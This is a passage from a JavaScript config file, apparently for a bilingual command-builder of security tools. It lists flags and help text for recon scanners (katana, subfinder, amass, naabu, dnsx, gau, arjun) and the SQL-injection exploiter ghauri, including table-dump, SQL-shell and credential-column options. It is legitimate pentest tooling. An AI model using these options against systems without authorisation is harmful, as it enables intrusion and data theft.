      { id:'_d', flag:'-d', help: M('Request body (-d/--data).', 'Request body (-d/--data).'), value:'user=admin' },
      { id:'_h', flag:'-H', help: M('HTTP header (-H/--header). Repeatable.', 'HTTP header (-H/--header). Repeatable.'), value:'Header: value' },
      { id:'__random_agent', flag:'--random-agent', help: M('Random User-Agent on each request.', 'Random User-Agent on each request.') },
      { id:'__auth', flag:'--auth', help: M('Credentials (e.g. user:pass or a bearer token).', 'Credentials (e.g. user:pass or a bearer token).'), value:'user:pass' },
      { id:'__auth_type', flag:'--auth-type', help: M('Authentication type: basic, digest, bearer, ntlm.', 'Authentication type: basic, digest, bearer, ntlm.'), value:'basic' },
      { id:'__cookie', flag:'--cookie', help: M('Cookie header.', 'Cookie header.'), value:'name=value' },
      { id:'__user_agent', flag:'--user-agent', help: M('Fixed User-Agent.', 'Fixed User-Agent.'), value:'Mozilla/5.0' },
      { id:'_t', flag:'-t', help: M('Number of threads (-t/--threads), default 25.', 'Number of threads (-t/--threads), default 25.'), value:'25' },
      { id:'__timeout', flag:'--timeout', help: M('Connection timeout (default 7.5).', 'Connection timeout (default 7.5).'), value:'7.5' },
      { id:'__delay', flag:'--delay', help: M('Delay between requests.', 'Delay between requests.'), value:'0.5' },
      { id:'_p', flag:'-p', help: M('Proxy (HTTP/SOCKS), repeatable (-p/--proxy).', 'Proxy (HTTP/SOCKS), repeatable (-p/--proxy).'), value:'http://127.0.0.1:8080' },
      { id:'__proxy_auth', flag:'--proxy-auth', help: M('Proxy credentials.', 'Proxy credentials.'), value:'user:pass' },
      { id:'__max_rate', flag:'--max-rate', help: M('Maximum requests per second.', 'Maximum requests per second.'), value:'100' },
      { id:'__retries', flag:'--retries', help: M('Number of retries for failed requests.', 'Number of retries for failed requests.'), value:'1' },
      { id:'__scheme', flag:'--scheme', help: M('Scheme for a raw request or a URL without a scheme.', 'Scheme for a raw request or a URL without a scheme.'), value:'https' },
      { id:'__crawl', flag:'--crawl', help: M('Crawl found responses looking for new paths.', 'Crawl found responses looking for new paths.') },
      { id:'__full_url', flag:'--full-url', help: M('Show full URLs in the output.', 'Show full URLs in the output.') },
      { id:'_o', flag:'-o', help: M('Output file (-o/--output-file).', 'Output file (-o/--output-file).'), value:'out.txt' },
      { id:'_q', flag:'-q', help: M('Quiet mode (-q/--quiet-mode).', 'Quiet mode (-q/--quiet-mode).') },
      { id:'_v', flag:'-v', help: M('Verbose output (-v/--verbose): response time and content-type.', 'Verbose output (-v/--verbose): response time and content-type.') },
      { id:'__no_color', flag:'--no-color', help: M('No colored output.', 'No colored output.') },
    ],
  },
  {
    id: 'katana',
    name: 'katana',
    base: 'katana',
    desc: M('Быстрый веб-краулер ProjectDiscovery: собирает ссылки, формы и эндпоинты, в том числе из JavaScript, в обычном и headless-режимах.', 'Fast web crawler from ProjectDiscovery: collects links, forms and endpoints, including from JavaScript, in standard and headless modes.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('URL(s) to crawl (comma-separated) or a file', 'URL(s) to crawl (comma-separated) or a file'), value:'https://example.com' },
      { id:'_list', flag:'-list', help: M('File with a list of URLs to crawl', 'File with a list of URLs to crawl'), value:'urls.txt' },
      { id:'_e', flag:'-e', help: M('Exclude hosts (cdn, private-ips, cidr, ip, regex)', 'Exclude hosts (cdn, private-ips, cidr, ip, regex)'), value:'cdn,private-ips' },
      { id:'_resume', flag:'-resume', help: M('Resume a previous scan', 'Resume a previous scan'), value:'resume.cfg' },
      { id:'_d', flag:'-d', help: M('Maximum crawl depth', 'Maximum crawl depth'), value:'3' },
      { id:'_jc', flag:'-jc', help: M('Parse endpoints from JavaScript (js-crawl)', 'Parse endpoints from JavaScript (js-crawl)') },
      { id:'_kf', flag:'-kf', help: M('Crawl known files (all, robotstxt, sitemapxml)', 'Crawl known files (all, robotstxt, sitemapxml)'), value:'all' },
      { id:'_ct', flag:'-ct', help: M('Crawl time limit (s, m, h, d)', 'Crawl time limit (s, m, h, d)'), value:'10m' },
      { id:'_aff', flag:'-aff', help: M('Auto form fill (experimental)', 'Auto form fill (experimental)') },
      { id:'_fx', flag:'-fx', help: M('Extract forms into the JSONL output', 'Extract forms into the JSONL output') },
      { id:'_s', flag:'-s', help: M('Traversal strategy (depth-first, breadth-first)', 'Traversal strategy (depth-first, breadth-first)'), value:'breadth-first' },
      { id:'_h', flag:'-H', help: M('Custom headers/cookies (header:value)', 'Custom headers/cookies (header:value)'), value:'Cookie: a=b' },
      { id:'_proxy', flag:'-proxy', help: M('HTTP/SOCKS5 proxy', 'HTTP/SOCKS5 proxy'), value:'http://127.0.0.1:8080' },
      { id:'_timeout', flag:'-timeout', help: M('Request timeout in seconds', 'Request timeout in seconds'), value:'10' },
      { id:'_hl', flag:'-hl', help: M('Hybrid headless crawling (renders JS in a browser)', 'Hybrid headless crawling (renders JS in a browser)') },
      { id:'_sc', flag:'-sc', help: M('Use a local Chrome instead of the bundled one', 'Use a local Chrome instead of the bundled one') },
      { id:'_sb', flag:'-sb', help: M('Show the browser window', 'Show the browser window') },
      { id:'_nos', flag:'-nos', help: M('Launch Chrome in --no-sandbox mode', 'Launch Chrome in --no-sandbox mode') },
      { id:'_xhr', flag:'-xhr', help: M('Extract XHR requests into JSONL', 'Extract XHR requests into JSONL') },
      { id:'_cs', flag:'-cs', help: M('regex for in-scope URLs', 'regex for in-scope URLs'), value:'login' },
      { id:'_cos', flag:'-cos', help: M('regex for out-of-scope URLs', 'regex for out-of-scope URLs'), value:'logout' },
      { id:'_fs', flag:'-fs', help: M('Scope field (dn, rdn, fqdn) or a custom regex', 'Scope field (dn, rdn, fqdn) or a custom regex'), value:'fqdn' },
      { id:'_do', flag:'-do', help: M('Also show external endpoints', 'Also show external endpoints') },
      { id:'_mr', flag:'-mr', help: M('Keep URLs by regex', 'Keep URLs by regex'), value:'admin' },
      { id:'_fr', flag:'-fr', help: M('Filter out URLs by regex', 'Filter out URLs by regex'), value:'logout' },
      { id:'_em', flag:'-em', help: M('Keep only the given extensions', 'Keep only the given extensions'), value:'php,js' },
      { id:'_ef', flag:'-ef', help: M('Filter out the given extensions', 'Filter out the given extensions'), value:'png,css' },
      { id:'_mdc', flag:'-mdc', help: M('Match condition (DSL)', 'Match condition (DSL)'), value:'status_code==200' },
      { id:'_c', flag:'-c', help: M('Number of parallel workers (fetchers)', 'Number of parallel workers (fetchers)'), value:'10' },
      { id:'_p', flag:'-p', help: M('Parallel processing of input targets', 'Parallel processing of input targets'), value:'10' },
      { id:'_rl', flag:'-rl', help: M('Requests-per-second limit (global)', 'Requests-per-second limit (global)'), value:'150' },
      { id:'_rd', flag:'-rd', help: M('Delay between requests (sec)', 'Delay between requests (sec)'), value:'1' },
      { id:'_o', flag:'-o', help: M('Output file', 'Output file'), value:'urls.txt' },
      { id:'_j', flag:'-j', help: M('Output in JSONL format', 'Output in JSONL format') },
      { id:'_sr', flag:'-sr', help: M('Save requests/responses to disk', 'Save requests/responses to disk') },
      { id:'_silent', flag:'-silent', help: M('Silent mode: results only', 'Silent mode: results only') },
    ],
  },
  {
    id: 'gau',
    name: 'gau',
    base: 'gau',
    desc: M('getallurls (gau) тянет известные URL домена из Wayback Machine, Common Crawl, OTX и URLScan. Пассивный сбор без касания сайта.', 'getallurls (gau) pulls a domain\'s known URLs from the Wayback Machine, Common Crawl, OTX and URLScan. Passive collection without touching the site itself.'),
    targetPlaceholder: '{TARGET}',
    flags: [
      { id:'__providers', flag:'--providers', help: M('Data sources (wayback, commoncrawl, otx, urlscan)', 'Data sources (wayback, commoncrawl, otx, urlscan)'), value:'wayback,otx' },
      { id:'__subs', flag:'--subs', help: M('Include subdomains in the results', 'Include subdomains in the results') },
      { id:'__from', flag:'--from', help: M('Start date for the URL selection (YYYYMM)', 'Start date for the URL selection (YYYYMM)'), value:'202301' },
      { id:'__to', flag:'--to', help: M('End date for the URL selection (YYYYMM)', 'End date for the URL selection (YYYYMM)'), value:'202412' },
      { id:'__blacklist', flag:'--blacklist', help: M('Skip the given file extensions', 'Skip the given file extensions'), value:'png,jpg,css,woff' },
      { id:'__mc', flag:'--mc', help: M('Keep URLs only with these status codes', 'Keep URLs only with these status codes'), value:'200,500' },
      { id:'__fc', flag:'--fc', help: M('Filter out URLs with these status codes', 'Filter out URLs with these status codes'), value:'404,302' },
      { id:'__mt', flag:'--mt', help: M('Keep only these MIME types', 'Keep only these MIME types'), value:'text/html' },
      { id:'__ft', flag:'--ft', help: M('Filter out these MIME types', 'Filter out these MIME types'), value:'image/png' },
      { id:'__fp', flag:'--fp', help: M('Remove duplicate endpoints with different parameters', 'Remove duplicate endpoints with different parameters') },
      { id:'__threads', flag:'--threads', help: M('Number of worker threads', 'Number of worker threads'), value:'5' },
      { id:'__timeout', flag:'--timeout', help: M('HTTP timeout in seconds', 'HTTP timeout in seconds'), value:'60' },
      { id:'__retries', flag:'--retries', help: M('Number of HTTP client retries', 'Number of HTTP client retries'), value:'5' },
      { id:'__proxy', flag:'--proxy', help: M('HTTP/SOCKS5 proxy', 'HTTP/SOCKS5 proxy'), value:'http://127.0.0.1:8080' },
      { id:'__o', flag:'--o', help: M('Write results to a file', 'Write results to a file'), value:'urls.txt' },
      { id:'__json', flag:'--json', help: M('Output in JSON format', 'Output in JSON format') },
      { id:'__verbose', flag:'--verbose', help: M('Verbose output', 'Verbose output') },
      { id:'__config', flag:'--config', help: M('Path to the configuration file', 'Path to the configuration file'), value:'$HOME/.gau.toml' },
    ],
  },
  {
    id: 'subfinder',
    name: 'subfinder',
    base: 'subfinder',
    desc: M('Пассивный enum поддоменов ProjectDiscovery через онлайн-источники (crt.sh, VirusTotal и др.). Быстро и тихо относительно цели.', 'Passive subdomain enumeration from ProjectDiscovery via many online sources (crt.sh, VirusTotal, etc.). Fast and quiet against the target.'),
    targetPlaceholder: '-d {TARGET}',
    flags: [
      { id:'_d', flag:'-d', help: M('Domain(s) to find subdomains for (comma-separated)', 'Domain(s) to find subdomains for (comma-separated)'), value:'example.com' },
      { id:'_dl', flag:'-dL', help: M('File with a list of domains', 'File with a list of domains'), value:'domains.txt' },
      { id:'_s', flag:'-s', help: M('Use only the given sources', 'Use only the given sources'), value:'crtsh,github' },
      { id:'_es', flag:'-es', help: M('Exclude the given sources', 'Exclude the given sources'), value:'shodan' },
      { id:'_all', flag:'-all', help: M('Use all sources (slower)', 'Use all sources (slower)') },
      { id:'_recursive', flag:'-recursive', help: M('Only sources that support recursive search', 'Only sources that support recursive search') },
      { id:'_ls', flag:'-ls', help: M('Show the list of available sources', 'Show the list of available sources') },
      { id:'_m', flag:'-m', help: M('Keep only matching subdomains', 'Keep only matching subdomains'), value:'dev' },
      { id:'_f', flag:'-f', help: M('Filter out the given subdomains', 'Filter out the given subdomains'), value:'test' },
      { id:'_nw', flag:'-nW', help: M('Show only active (resolving) subdomains', 'Show only active (resolving) subdomains') },
      { id:'_r', flag:'-r', help: M('Custom DNS resolvers (comma-separated)', 'Custom DNS resolvers (comma-separated)'), value:'8.8.8.8' },
      { id:'_rl', flag:'-rL', help: M('File with a list of resolvers', 'File with a list of resolvers'), value:'resolvers.txt' },
      { id:'_t', flag:'-t', help: M('Number of threads for resolution', 'Number of threads for resolution'), value:'10' },
      { id:'_timeout', flag:'-timeout', help: M('HTTP timeout in seconds', 'HTTP timeout in seconds'), value:'30' },
      { id:'_max_time', flag:'-max-time', help: M('Maximum enumeration time (minutes)', 'Maximum enumeration time (minutes)'), value:'10' },
      { id:'_proxy', flag:'-proxy', help: M('HTTP proxy', 'HTTP proxy'), value:'http://127.0.0.1:8080' },
      { id:'_o', flag:'-o', help: M('File to write results to', 'File to write results to'), value:'subs.txt' },
      { id:'_oj', flag:'-oJ', help: M('Output in JSONL format', 'Output in JSONL format') },
      { id:'_od', flag:'-oD', help: M('Output folder when there are multiple domains', 'Output folder when there are multiple domains'), value:'out/' },
      { id:'_cs', flag:'-cs', help: M('Add the source to the JSON output', 'Add the source to the JSON output') },
      { id:'_oi', flag:'-oI', help: M('Show resolved IPs (active only)', 'Show resolved IPs (active only)') },
      { id:'_silent', flag:'-silent', help: M('Silent mode: subdomains only', 'Silent mode: subdomains only') },
      { id:'_nc', flag:'-nc', help: M('Disable output color', 'Disable output color') },
      { id:'_v', flag:'-v', help: M('Verbose output', 'Verbose output') },
    ],
  },
  {
    id: 'amass',
    name: 'amass',
    base: 'amass',
    desc: M('Мощный OWASP-фреймворк DNS-recon и карты attack surface: пассивные источники, брут и активная валидация поддоменов с graph DB.', 'Powerful OWASP framework for DNS recon and attack surface mapping: passive sources, brute-forcing and active validation of subdomains with a graph database.'),
    targetPlaceholder: 'enum -d {TARGET}',
    flags: [
      { id:'_d', flag:'-d', help: M('Target domain(s) (comma-separated, repeatable)', 'Target domain(s) (comma-separated, repeatable)'), value:'example.com' },
      { id:'_df', flag:'-df', help: M('File with root domains', 'File with root domains'), value:'domains.txt' },
      { id:'_passive', flag:'-passive', help: M('Passive collection from sources only (no DNS)', 'Passive collection from sources only (no DNS)') },
      { id:'_active', flag:'-active', help: M('Active recon (touching the found nodes)', 'Active recon (touching the found nodes)') },
      { id:'_brute', flag:'-brute', help: M('Brute-force subdomains from a wordlist', 'Brute-force subdomains from a wordlist') },
      { id:'_w', flag:'-w', help: M('Custom wordlist for brute-forcing', 'Custom wordlist for brute-forcing'), value:'wordlist.txt' },
      { id:'_include', flag:'-include', help: M('Use only the given sources', 'Use only the given sources'), value:'crtsh' },
      { id:'_exclude', flag:'-exclude', help: M('Exclude the given sources', 'Exclude the given sources'), value:'shodan' },
      { id:'_list', flag:'-list', help: M('Show the list of available sources', 'Show the list of available sources') },
      { id:'_config', flag:'-config', help: M('YAML config (API keys, scope, wordlists)', 'YAML config (API keys, scope, wordlists)'), value:'config.yaml' },
      { id:'_r', flag:'-r', help: M('Untrusted DNS resolvers (repeatable)', 'Untrusted DNS resolvers (repeatable)'), value:'8.8.8.8,1.1.1.1' },
      { id:'_rf', flag:'-rf', help: M('File with untrusted resolvers', 'File with untrusted resolvers'), value:'resolvers.txt' },
      { id:'_tr', flag:'-tr', help: M('Trusted DNS resolvers', 'Trusted DNS resolvers'), value:'1.1.1.1' },
      { id:'_dns_qps', flag:'-dns-qps', help: M('DNS queries-per-second limit (across all resolvers)', 'DNS queries-per-second limit (across all resolvers)'), value:'200' },
      { id:'_norecursive', flag:'-norecursive', help: M('Disable recursive brute-forcing', 'Disable recursive brute-forcing') },
      { id:'_max_depth', flag:'-max-depth', help: M('Maximum subdomain labels for brute-forcing', 'Maximum subdomain labels for brute-forcing'), value:'3' },
      { id:'_bl', flag:'-bl', help: M('Subdomain blacklist (exclude)', 'Subdomain blacklist (exclude)'), value:'old.example.com' },
      { id:'_blf', flag:'-blf', help: M('File with a subdomain blacklist', 'File with a subdomain blacklist'), value:'blacklist.txt' },
      { id:'_nf', flag:'-nf', help: M('File with already-known names (to mix in)', 'File with already-known names (to mix in)'), value:'names.txt' },
      { id:'_p', flag:'-p', help: M('Ports to check (default 443)', 'Ports to check (default 443)'), value:'443,8443' },
      { id:'_timeout', flag:'-timeout', help: M('Enumeration runtime (minutes)', 'Enumeration runtime (minutes)'), value:'30' },
      { id:'_o', flag:'-o', help: M('Text output file', 'Text output file'), value:'out.txt' },
      { id:'_oa', flag:'-oA', help: M('Prefix for all output formats', 'Prefix for all output formats'), value:'amass_scan' },
      { id:'_dir', flag:'-dir', help: M('Folder for the results graph database', 'Folder for the results graph database'), value:'amass_db' },
      { id:'_ip', flag:'-ip', help: M('Show IPs of found names', 'Show IPs of found names') },
      { id:'_ipv4', flag:'-ipv4', help: M('Show only IPv4 addresses', 'Show only IPv4 addresses') },
      { id:'_v', flag:'-v', help: M('Verbose output (status/debug)', 'Verbose output (status/debug)') },
      { id:'_silent', flag:'-silent', help: M('Disable all output during the run', 'Disable all output during the run') },
      { id:'_nocolor', flag:'-nocolor', help: M('Disable output color', 'Disable output color') },
    ],
  },
  {
    id: 'naabu',
    name: 'naabu',
    base: 'naabu',
    desc: M('Быстрый Go port-scanner ProjectDiscovery: SYN/CONNECT, host discovery, удобно стыкуется с httpx и nmap.', 'Fast Go port scanner from ProjectDiscovery: SYN/CONNECT scans, host discovery, convenient pairing with httpx and nmap for verification.'),
    targetPlaceholder: '-host {TARGET}',
    flags: [
      { id:'_host', flag:'-host', help: M('Host(s) to scan (comma-separated)', 'Host(s) to scan (comma-separated)'), value:'example.com' },
      { id:'_list', flag:'-list', help: M('File with a list of hosts', 'File with a list of hosts'), value:'hosts.txt' },
      { id:'_eh', flag:'-eh', help: M('Exclude hosts (comma-separated)', 'Exclude hosts (comma-separated)'), value:'10.0.0.1' },
      { id:'_ef', flag:'-ef', help: M('File with hosts to exclude', 'File with hosts to exclude'), value:'exclude.txt' },
      { id:'_p', flag:'-p', help: M('Ports to scan (comma-separated/range)', 'Ports to scan (comma-separated/range)'), value:'80,443,8000-9000' },
      { id:'_tp', flag:'-tp', help: M('Top ports (full, 100, 1000)', 'Top ports (full, 100, 1000)'), value:'1000' },
      { id:'_ep', flag:'-ep', help: M('Exclude ports', 'Exclude ports'), value:'22' },
      { id:'_pf', flag:'-pf', help: M('File with a list of ports', 'File with a list of ports'), value:'ports.txt' },
      { id:'_ec', flag:'-ec', help: M('Do not scan CDN/WAF in full (only 80,443)', 'Do not scan CDN/WAF in full (only 80,443)') },
      { id:'_s', flag:'-s', help: M('Scan type: SYN or CONNECT (default CONNECT)', 'Scan type: SYN or CONNECT (default CONNECT)'), value:'SYN' },
      { id:'_sa', flag:'-sa', help: M('Scan all IPs associated with the domain', 'Scan all IPs associated with the domain') },
      { id:'_iv', flag:'-iv', help: M('IP versions (4, 6)', 'IP versions (4, 6)'), value:'4' },
      { id:'_nmap_cli', flag:'-nmap-cli', help: M('Run the found ports through nmap', 'Run the found ports through nmap'), value:'nmap -sV' },
      { id:'_passive', flag:'-passive', help: M('Passive mode via Shodan InternetDB', 'Passive mode via Shodan InternetDB') },
      { id:'_proxy', flag:'-proxy', help: M('SOCKS5 proxy', 'SOCKS5 proxy'), value:'socks5://127.0.0.1:9050' },
      { id:'_sn', flag:'-sn', help: M('Host discovery only (no port scan)', 'Host discovery only (no port scan)') },
      { id:'_pn', flag:'-Pn', help: M('Skip host discovery (scan all)', 'Skip host discovery (scan all)') },
      { id:'_pe', flag:'-pe', help: M('ICMP echo ping for discovery', 'ICMP echo ping for discovery') },
      { id:'_ps', flag:'-ps', help: M('TCP SYN ping on ports', 'TCP SYN ping on ports'), value:'80' },
      { id:'_c', flag:'-c', help: M('Number of workers (threads)', 'Number of workers (threads)'), value:'25' },
      { id:'_rate', flag:'-rate', help: M('Packets per second', 'Packets per second'), value:'1000' },
      { id:'_retries', flag:'-retries', help: M('Number of retries', 'Number of retries'), value:'3' },
      { id:'_timeout', flag:'-timeout', help: M('Timeout in milliseconds', 'Timeout in milliseconds'), value:'1000' },
      { id:'_verify', flag:'-verify', help: M('TCP verification of found ports (no false positives)', 'TCP verification of found ports (no false positives)') },
      { id:'_o', flag:'-o', help: M('Output file', 'Output file'), value:'ports.txt' },
      { id:'_j', flag:'-j', help: M('Output in JSONL format', 'Output in JSONL format') },
      { id:'_csv', flag:'-csv', help: M('Output in CSV format', 'Output in CSV format') },
      { id:'_silent', flag:'-silent', help: M('Silent mode: results only', 'Silent mode: results only') },
      { id:'_v', flag:'-v', help: M('Verbose output', 'Verbose output') },
      { id:'_cdn', flag:'-cdn', help: M('Show the CDN in use', 'Show the CDN in use') },
    ],
  },
  {
    id: 'dnsx',
    name: 'dnsx',
    base: 'dnsx',
    desc: M('Быстрый DNS-тул ProjectDiscovery: bulk resolve, любые типы записей, DNS-брут и фильтр wildcard.', 'Fast multipurpose DNS tool from ProjectDiscovery: bulk resolution, querying any record type, DNS brute-forcing and wildcard filtering.'),
    targetPlaceholder: '-l {TARGET}',
    flags: [
      { id:'_l', flag:'-l', help: M('List of domains/hosts to resolve (or stdin)', 'List of domains/hosts to resolve (or stdin)'), value:'hosts.txt' },
      { id:'_d', flag:'-d', help: M('Domain(s) for brute-forcing (with -w)', 'Domain(s) for brute-forcing (with -w)'), value:'example.com' },
      { id:'_w', flag:'-w', help: M('Wordlist for DNS brute-forcing', 'Wordlist for DNS brute-forcing'), value:'words.txt' },
      { id:'_a', flag:'-a', help: M('Query the A record (default)', 'Query the A record (default)') },
      { id:'_aaaa', flag:'-aaaa', help: M('Query the AAAA record (IPv6)', 'Query the AAAA record (IPv6)') },
      { id:'_cname', flag:'-cname', help: M('Query the CNAME record', 'Query the CNAME record') },
      { id:'_ns', flag:'-ns', help: M('Query the NS record', 'Query the NS record') },
      { id:'_txt', flag:'-txt', help: M('Query the TXT record', 'Query the TXT record') },
      { id:'_mx', flag:'-mx', help: M('Query the MX record', 'Query the MX record') },
      { id:'_ptr', flag:'-ptr', help: M('Query the PTR record (reverse DNS)', 'Query the PTR record (reverse DNS)') },
      { id:'_soa', flag:'-soa', help: M('Query the SOA record', 'Query the SOA record') },
      { id:'_axfr', flag:'-axfr', help: M('Attempt a zone transfer (AXFR)', 'Attempt a zone transfer (AXFR)') },
      { id:'_recon', flag:'-recon', help: M('Query all DNS record types', 'Query all DNS record types') },
      { id:'_re', flag:'-re', help: M('Show the DNS response (resp)', 'Show the DNS response (resp)') },
      { id:'_ro', flag:'-ro', help: M('Show the response only (resp-only)', 'Show the response only (resp-only)') },
      { id:'_rc', flag:'-rc', help: M('Filter by DNS status (noerror, servfail, nxdomain)', 'Filter by DNS status (noerror, servfail, nxdomain)'), value:'noerror' },
      { id:'_cdn', flag:'-cdn', help: M('Show the CDN name', 'Show the CDN name') },
      { id:'_asn', flag:'-asn', help: M('Show the host\'s ASN', 'Show the host\'s ASN') },
      { id:'_r', flag:'-r', help: M('Custom resolvers (UDP/TCP/DOH/DOT)', 'Custom resolvers (UDP/TCP/DOH/DOT)'), value:'8.8.8.8,1.1.1.1' },
      { id:'_wt', flag:'-wt', help: M('Wildcard filter threshold', 'Wildcard filter threshold'), value:'5' },
      { id:'_wd', flag:'-wd', help: M('Domain for wildcard filtering', 'Domain for wildcard filtering'), value:'example.com' },
      { id:'_hf', flag:'-hf', help: M('Use the system hosts file', 'Use the system hosts file') },
      { id:'_trace', flag:'-trace', help: M('DNS tracing', 'DNS tracing') },
      { id:'_t', flag:'-t', help: M('Number of parallel threads', 'Number of parallel threads'), value:'100' },
      { id:'_rl', flag:'-rl', help: M('DNS queries-per-second limit (-1 = off)', 'DNS queries-per-second limit (-1 = off)'), value:'-1' },
      { id:'_retry', flag:'-retry', help: M('Number of DNS attempts', 'Number of DNS attempts'), value:'2' },
      { id:'_timeout', flag:'-timeout', help: M('Request timeout', 'Request timeout'), value:'3s' },
      { id:'_o', flag:'-o', help: M('File to write results to', 'File to write results to'), value:'resolved.txt' },
      { id:'_j', flag:'-j', help: M('Output in JSONL format', 'Output in JSONL format') },
      { id:'_silent', flag:'-silent', help: M('Silent mode: results only', 'Silent mode: results only') },
      { id:'_v', flag:'-v', help: M('Verbose output', 'Verbose output') },
      { id:'_nc', flag:'-nc', help: M('Disable output color', 'Disable output color') },
      { id:'_stats', flag:'-stats', help: M('Show statistics', 'Show statistics') },
    ],
  },
  {
    id: 'ghauri',
    name: 'ghauri',
    base: 'ghauri',
    desc: M('Лёгкая и быстрая альтернатива sqlmap для поиска и эксплуатации SQLi; часто проходит там, где sqlmap зависает на blind.', 'A lightweight, fast alternative to sqlmap for detecting and exploiting SQL injections; often succeeds where sqlmap stalls on blind.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('Target URL with a parameter, e.g. \'http://site/vuln.php?id=1\'', 'Target URL with a parameter, e.g. \'http://site/vuln.php?id=1\''), value:'{TARGET}' },
      { id:'_r', flag:'-r', help: M('Load the HTTP request from a file', 'Load the HTTP request from a file'), value:'req.txt' },
      { id:'_m', flag:'-m', help: M('Scan multiple targets from a file', 'Scan multiple targets from a file'), value:'urls.txt' },
      { id:'__data', flag:'--data', help: M('POST data to test', 'POST data to test'), value:'\'id=1\'' },
      { id:'__cookie', flag:'--cookie', help: M('Cookie header value', 'Cookie header value'), value:'\'sid=...\'' },
      { id:'_p', flag:'-p', help: M('Test only the specified parameters', 'Test only the specified parameters'), value:'id' },
      { id:'_h', flag:'-H', help: M('Additional HTTP header', 'Additional HTTP header'), value:'\'X-Up: 1\'' },
      { id:'__random_agent', flag:'--random-agent', help: M('Random User-Agent', 'Random User-Agent') },
      { id:'__proxy', flag:'--proxy', help: M('Proxy for traffic', 'Proxy for traffic'), value:'http://127.0.0.1:8080' },
      { id:'__delay', flag:'--delay', help: M('Delay between requests, seconds', 'Delay between requests, seconds'), value:'1' },
      { id:'__timeout', flag:'--timeout', help: M('Connection timeout, seconds (default 30)', 'Connection timeout, seconds (default 30)'), value:'30' },
      { id:'__threads', flag:'--threads', help: M('Number of parallel requests', 'Number of parallel requests'), value:'1' },
      { id:'__level', flag:'--level', help: M('Test depth 1-3: higher means more entry points and payloads', 'Test depth 1-3: higher means more entry points and payloads'), value:'1' },
      { id:'__technique', flag:'--technique', help: M('Injection types (default BEST): B=boolean-blind, E=error-based, S=stacked queries, T=time-blind. You can add U=union', 'Injection types (default BEST): B=boolean-blind, E=error-based, S=stacked queries, T=time-blind. You can add U=union'), value:'BEST' },
      { id:'__dbms', flag:'--dbms', help: M('Force the DBMS', 'Force the DBMS'), value:'MySQL' },
      { id:'__time_sec', flag:'--time-sec', help: M('Delay for time-based blind, seconds', 'Delay for time-based blind, seconds'), value:'5' },
      { id:'__string', flag:'--string', help: M('String present in the response when True', 'String present in the response when True'), value:'\'OK\'' },
      { id:'__confirm', flag:'--confirm', help: M('Additionally re-verify the found payloads', 'Additionally re-verify the found payloads') },
      { id:'__dbs', flag:'--dbs', help: M('Enumerate databases', 'Enumerate databases') },
      { id:'__tables', flag:'--tables', help: M('Enumerate tables (with -D)', 'Enumerate tables (with -D)') },
      { id:'__columns', flag:'--columns', help: M('Enumerate columns (with -D and -T)', 'Enumerate columns (with -D and -T)') },
      { id:'__dump', flag:'--dump', help: M('Dump table records', 'Dump table records') },
      { id:'__count', flag:'--count', help: M('Number of records in tables', 'Number of records in tables') },
      { id:'_d', flag:'-D', help: M('Specify the database', 'Specify the database'), value:'dbname' },
      { id:'_t', flag:'-T', help: M('Specify the table(s)', 'Specify the table(s)'), value:'users' },
      { id:'_c', flag:'-C', help: M('Specify the columns', 'Specify the columns'), value:'user,pass' },
      { id:'__current_user', flag:'--current-user', help: M('Current DB user', 'Current DB user') },
      { id:'__current_db', flag:'--current-db', help: M('Current database', 'Current database') },
      { id:'__hostname', flag:'--hostname', help: M('DB server hostname', 'DB server hostname') },
      { id:'_b', flag:'-b', help: M('Get the DBMS banner/version (--banner)', 'Get the DBMS banner/version (--banner)') },
      { id:'__start', flag:'--start', help: M('Which record to start the dump from', 'Which record to start the dump from'), value:'1' },
      { id:'__stop', flag:'--stop', help: M('Which record to stop at', 'Which record to stop at'), value:'100' },
      { id:'__batch', flag:'--batch', help: M('Ask no questions - use the default values', 'Ask no questions - use the default values') },
      { id:'__flush_session', flag:'--flush-session', help: M('Reset the saved session', 'Reset the saved session') },
      { id:'__fresh_queries', flag:'--fresh-queries', help: M('Ignore the results cache', 'Ignore the results cache') },
      { id:'__sql_shell', flag:'--sql-shell', help: M('Interactive SQL console (experimental)', 'Interactive SQL console (experimental)') },
      { id:'_v', flag:'-v', help: M('Verbosity level 1-5', 'Verbosity level 1-5'), value:'1' },
    ],
  },
  {
    id: 'arjun',
    name: 'arjun',
    base: 'arjun',
    desc: M('Брутит тысячи имён параметров и находит скрытые/недокументированные GET/POST/JSON у эндпоинта — старт для IDOR, инъекций, logic bypass.', 'Brute-forces thousands of parameter names and finds hidden/undocumented GET/POST/JSON parameters of an endpoint - a starting point for IDOR, injections, logic bypasses.'),
    targetPlaceholder: '-u {TARGET}',
    flags: [
      { id:'_u', flag:'-u', help: M('A single target URL', 'A single target URL'), value:'{TARGET}' },
      { id:'_i', flag:'-i', help: M('Import targets from a file (text, Burp or raw request)', 'Import targets from a file (text, Burp or raw request)'), value:'targets.txt' },
      { id:'_m', flag:'-m', help: M('HTTP method: GET / POST / JSON / XML', 'HTTP method: GET / POST / JSON / XML'), value:'GET' },
      { id:'__headers', flag:'--headers', help: M('Custom HTTP headers for the requests', 'Custom HTTP headers for the requests'), value:'\'Cookie: x=1\'' },
      { id:'__include', flag:'--include', help: M('Parameters/data added to every request', 'Parameters/data added to every request'), value:'\'api_key=KEY\'' },
      { id:'_w', flag:'-w', help: M('Custom wordlist of parameter names', 'Custom wordlist of parameter names'), value:'params.txt' },
      { id:'_c', flag:'-c', help: M('Chunk size - how many parameters to send in one request', 'Chunk size - how many parameters to send in one request'), value:'250' },
      { id:'__passive', flag:'--passive', help: M('Passive parameter collection from JS and external sources (no brute force)', 'Passive parameter collection from JS and external sources (no brute force)') },
      { id:'__stable', flag:'--stable', help: M('Stable mode: slower but more reliable against unstable targets', 'Stable mode: slower but more reliable against unstable targets') },
      { id:'__casing', flag:'--casing', help: M('Name casing style (camel/pascal/snake etc.)', 'Name casing style (camel/pascal/snake etc.)'), value:'snake' },
      { id:'_t', flag:'-t', help: M('Number of threads', 'Number of threads'), value:'10' },
      { id:'_d', flag:'-d', help: M('Delay between requests, seconds', 'Delay between requests, seconds'), value:'0' },
      { id:'__rate_limit', flag:'--rate-limit', help: M('Requests-per-second limit', 'Requests-per-second limit'), value:'9999' },
      { id:'__disable_redirects', flag:'--disable-redirects', help: M('Do not follow redirects', 'Do not follow redirects') },
      { id:'_o', flag:'-o', help: M('Save the result to a file', 'Save the result to a file'), value:'out.txt' },
